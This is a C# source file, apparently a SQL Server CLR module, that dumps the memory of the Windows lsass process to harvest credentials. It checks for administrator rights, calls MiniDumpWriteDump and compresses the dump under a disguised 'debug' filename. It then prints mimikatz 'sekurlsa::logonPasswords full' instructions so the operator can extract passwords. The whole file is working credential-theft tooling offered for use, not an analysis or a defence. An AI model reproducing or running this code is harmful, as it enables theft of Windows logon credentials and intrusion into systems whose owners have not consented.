using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Security.Principal;
using Microsoft.SqlServer.Server;
using Microsoft.Win32;

namespace CLR_module;

internal class dumplsass
{
	[DllImport("dbghelp.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	private static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

	public static bool IsHighIntegrity()
	{
		WindowsIdentity current = WindowsIdentity.GetCurrent();
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
		return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void Compress(string inFile, string outFile)
	{
		try
		{
			if (File.Exists(outFile))
			{
				SqlContext.Pipe.Send($"[X] Output file '{outFile}' already exists, removing");
				File.Delete(outFile);
			}
			byte[] array = File.ReadAllBytes(inFile);
			using FileStream stream = new FileStream(outFile, FileMode.CreateNew);
			using GZipStream gZipStream = new GZipStream(stream, CompressionMode.Compress, leaveOpen: false);
			gZipStream.Write(array, 0, array.Length);
		}
		catch (Exception ex)
		{
			SqlContext.Pipe.Send($"[X] Exception while compressing file: {ex.Message}");
		}
	}

	public static void Minidump(string dumpDir)
	{
		int num = -1;
		IntPtr zero = IntPtr.Zero;
		uint num2 = 0u;
		Process process = null;
		if (num == -1)
		{
			Process[] processesByName = Process.GetProcessesByName("lsass");
			process = processesByName[0];
		}
		else
		{
			try
			{
				process = Process.GetProcessById(num);
			}
			catch (Exception ex)
			{
				SqlContext.Pipe.Send($"\n[X]Exception: {ex.Message}\n");
				return;
			}
		}
		if (process.ProcessName == "lsass" && !IsHighIntegrity())
		{
			SqlContext.Pipe.Send("\n[X] Not in high integrity, unable to MiniDump!\n");
			return;
		}
		try
		{
			num2 = (uint)process.Id;
			zero = process.Handle;
		}
		catch (Exception ex2)
		{
			SqlContext.Pipe.Send($"\n[X] Error getting handle to {process.ProcessName} ({process.Id}): {ex2.Message}\n");
			return;
		}
		bool flag = false;
		string text = $"{dumpDir}\\debug{num2}.out";
		string text2 = $"{dumpDir}\\debug{num2}.bin";
		SqlContext.Pipe.Send($"\n[*] Dumping {process.ProcessName} ({process.Id}) to {text}");
		using (FileStream fileStream = new FileStream(text, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
		{
			flag = MiniDumpWriteDump(zero, num2, fileStream.SafeFileHandle, 2u, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
		}
		if (flag)
		{
			SqlContext.Pipe.Send("[+] Dump successful!");
			SqlContext.Pipe.Send($"\n[*] Compressing {text} to {text2} gzip file");
			Compress(text, text2);
			SqlContext.Pipe.Send($"[*] Deleting {text}");
			File.Delete(text);
			SqlContext.Pipe.Send($"\n[+] Dumping completed. Rename file to \"debug{num2}.gz\" to decompress.");
			string environmentVariable = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
			string arg = "";
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
			if (registryKey != null)
			{
				arg = string.Format("{0}", registryKey.GetValue("ProductName"));
			}
			if (num == -1)
			{
				SqlContext.Pipe.Send($"\n[*] Operating System : {arg}");
				SqlContext.Pipe.Send($"[*] Architecture     : {environmentVariable}");
				SqlContext.Pipe.Send(string.Format("[*] Use \"sekurlsa::minidump debug.out\" \"sekurlsa::logonPasswords full\" on the same OS/arch\n", environmentVariable));
			}
		}
		else
		{
			SqlContext.Pipe.Send($"[X] Dump failed: {flag}");
		}
	}

	public static void run(string dumpDir)
	{
		if (!Directory.Exists(dumpDir))
		{
			SqlContext.Pipe.Send($"\n[X] Dump directory \"{dumpDir}\" doesn't exist!\n");
		}
		else
		{
			Minidump(dumpDir);
		}
	}
}
